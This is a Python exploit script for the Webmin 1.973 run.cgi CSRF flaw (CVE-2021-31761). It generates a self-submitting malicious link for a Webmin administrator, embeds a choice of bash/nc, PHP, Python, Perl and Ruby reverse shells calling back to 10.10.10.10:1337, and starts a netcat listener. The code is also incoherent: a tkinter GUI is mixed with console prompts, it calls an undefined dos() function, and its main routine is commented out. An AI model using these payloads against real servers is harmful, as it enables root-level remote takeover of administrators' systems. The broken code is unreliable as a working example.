# Exploit Title: Webmin 1.973 - 'run.cgi' Cross-Site Request Forgery (CSRF)
# Date: 24/04/2021
# Exploit Author: Mesh3l_911 & Z0ldyck
# Vendor Homepage: https://www.webmin.com
# Repo Link: https://github.com/Mesh3l911/CVE-2021-31761
# Version: Webmin 1.973
# Tested on: All versions <= 1.973
# CVE: CVE-2021-31761
# Description: Exploiting a Reflected Cross-Site Scripting (XSS) attack to
# get a Remote Command Execution (RCE) through the Webmin's running process
# feature

import time, subprocess,random,urllib.parse
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
def Apachemain():
    root = tkinter.Tk()
    root.title("CVE-2021-31761 exploits")
    root.geometry('800x600+0+0')
    def printInput():
        inp = inputtxt.get(1.0, "end-1c")
        lbl.config(text = "attack url : "+inp)
        target = inp
        scroll_y = Scrollbar(root, orient=VERTICAL)
        txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
        scroll_y.pack(side=RIGHT, fill=Y)
        scroll_y.config(command=txtarea.yview)

        ip = "10.10.10.10"

        port = "1337"

        ReverseShell = input \
        ('''\033[1;37m
        \n
        1- Bash Reverse Shell \n
        2- PHP Reverse Shell \n
        3- Python Reverse Shell \n
        4- Perl Reverse Shell \n
        5- Ruby Reverse Shell \n
        \033[1;m

        \033[1;36mPlease insert the number Reverse Shell's type u want e.g. ( 1 ) > \033[1;m''')

        file_name = random.randrange(1000)

        if ReverseShell == '1':
            ReverseShell = 'mkfifo /tmp/'+str(file_name)+'; nc '+ip+' '+port+' 0</tmp/'+str(file_name)+' | /bin/sh >/tmp/'+str(file_name)+' 2>&1; rm /tmp/'+str(file_name)+''

        elif ReverseShell == '2':
            ReverseShell = ''' php -r '$sock=fsockopen("''' + ip + '''",''' + port + ''');exec("/bin/sh -i <&3 >&3 2>&3");' '''

        elif ReverseShell == '3':
            ReverseShell = ''' python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("''' + ip + '''",''' + port + '''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' '''

        elif ReverseShell == '4':
            ReverseShell = ''' perl -e 'use Socket;$i="''' + ip + '''";$p=''' + port + ''';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' '''

        elif ReverseShell == '5':
            ReverseShell = ''' ruby -rsocket -e'f=TCPSocket.open("''' + ip + '''",''' + port + ''').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' '''

        else:
            print("\033[1;36m \n Please Re-Check ur input :( \033[1;m \n")

        def CSRF_Generator():
            Payload = urllib.parse.quote('''
<html>
        <head>
            <meta name="referrer" content="never">
        </head>
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="/proc/run.cgi" method="POST">
      <input type="hidden" name="cmd" value="''' + ReverseShell + '''" />
      <input type="hidden" name="mode" value="0" />
      <input type="hidden" name="user" value="root" />
      <input type="hidden" name="input" value="" />
      <input type="hidden" name="undefined" value="" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>

            </html>''')

            print("\033[1;36m\nHere's ur link , send it to a Webmin's Admin and wait for ur Reverse Shell ^_^ \n \n\033[1;m")

            print(target+Payload)

        def Netcat_listener():
            print()
            subprocess.run(["nc", "-nlvp "+port+""])


        def main12():
            dos()
            CSRF_Generator()
            Netcat_listener()
 
       # main12()
        txtarea.insert(END, "Response:")
        txtarea.insert(END, "\n----------------------------------------------------------------------------------\n")
        txtarea.pack(fill=BOTH, expand=True)
        txtarea.configure(state ='disabled')
    Hacher = Label(root, text="Enter url or domin https://www.example.com/api/v3 : ").pack()
    inputtxt = tk.Text(root,height = 1,width = 80)
    inputtxt.pack()
    printButton = tk.Button(root,text = "exploit", command = printInput)
    printButton.pack()
    lbl = tk.Label(root, text = "")
    lbl.pack()
    root.mainloop()
